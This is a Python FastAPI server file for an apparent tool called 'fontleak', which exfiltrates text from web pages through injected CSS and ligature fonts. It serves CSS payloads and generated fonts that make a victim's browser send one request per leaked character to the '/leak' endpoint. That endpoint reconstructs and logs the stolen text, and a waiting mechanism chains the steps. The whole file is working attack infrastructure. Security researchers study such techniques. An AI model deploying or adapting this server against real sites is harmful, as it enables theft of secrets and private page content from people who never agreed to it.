from fastapi import FastAPI, Request, Depends
from fastapi.templating import Jinja2Templates
from fastapi.responses import Response
from .schemas import (
    DynamicLeakSetupParams,
    StaticLeakSetupParams,
    DynamicLeakParams,
    DynamicLeakState,
    settings,
)
from .logger import logger
from .cssgen import dynamic as dynamic_css
from .fontgen import dynamic as dynamic_font
import asyncio

# Add in-memory storage for leak states and events
leak_states: dict[str, DynamicLeakState] = {}
leak_events: dict[str, asyncio.Event] = {}

app = FastAPI(
    title="fontleak",
    version="0.1.0",
    description="Fontleak server: Fast exfiltration of text using CSS and Ligatures",
)

# Setup templates
templates = Jinja2Templates(directory="templates")


@app.get("/")
async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
    logger.debug("Handling index request with params: %s", params)

    # Convert to BaseLeakSetupParams
    base_params = params.model_copy(update={}, deep=True)

    if params.id in leak_states:
        state = leak_states[params.id]
        if params.step is None or params.step > state.step:
            # Create event if it doesn't exist
            if params.id not in leak_events:
                leak_events[params.id] = asyncio.Event()
            # Wait for the next step with 2 second timeout
            try:
                await asyncio.wait_for(
                    leak_events[params.id].wait(), timeout=state.setup.timeout
                )
            except asyncio.TimeoutError:
                return Response(content="", media_type="text/css")
    else:
        # Create new state if id is not specified or not found
        if params.id is None or params.id not in leak_states:
            new_id = str(len(leak_states) + 1) if params.id is None else params.id
            font_path, step_map = dynamic_font.generate(params.alphabet)
            leak_states[new_id] = DynamicLeakState(
                id=new_id,
                setup=base_params,
                step=0,
                reconstruction="",
                step_map=step_map,
                font_path=font_path,
            )
            params.id = new_id

    state = leak_states[params.id]

    if params.staging:
        template = templates.get_template("dynamic-staging.css.jinja")
        css = dynamic_css.generate_staging(
            id=state.id,
            step=state.step,
            host=settings.host,
            template=template,
        )
        return Response(content=css, media_type="text/css")

    template = templates.get_template("dynamic.css.jinja")
    css = dynamic_css.generate(
        id=state.id,
        step=state.step,
        step_map=state.step_map,
        template=template,
        alphabet_size=len(params.alphabet),
        font_path=state.font_path,
        host=settings.host,
        leak_selector=params.selector,
    )
    return Response(content=css, media_type="text/css")


@app.get("/static")
def generate_static_payload(params: StaticLeakSetupParams = Depends()):
    logger.debug("Generating static payload with params: %s", params)
    return {"host": settings.host, **params.model_dump()}


@app.get("/leak")
async def leak(request: Request, params: DynamicLeakParams = Depends()):
    logger.debug("Handling leak request with params: %s", params)

    if isinstance(params, DynamicLeakParams):
        if params.id in leak_states:
            state = leak_states[params.id]
            # Update reconstruction and step
            if params.idx == len(state.setup.alphabet):
                state.reconstruction += "🗅"
            else:
                state.reconstruction += state.setup.alphabet[params.idx]

            state.step += 1

            logger.info("Leak update [%s]: %s", params.id, state.reconstruction)

            # Notify waiting requests
            if params.id in leak_events:
                leak_events[params.id].set()
                leak_events[params.id].clear()

    with open("templates/empty.png", "rb") as f:
        return Response(content=f.read(), media_type="image/png")


@app.get("/test")
def test():
    logger.debug("Handling test request")
    with open("templates/test.html", "r") as f:
        return Response(content=f.read(), media_type="text/html")
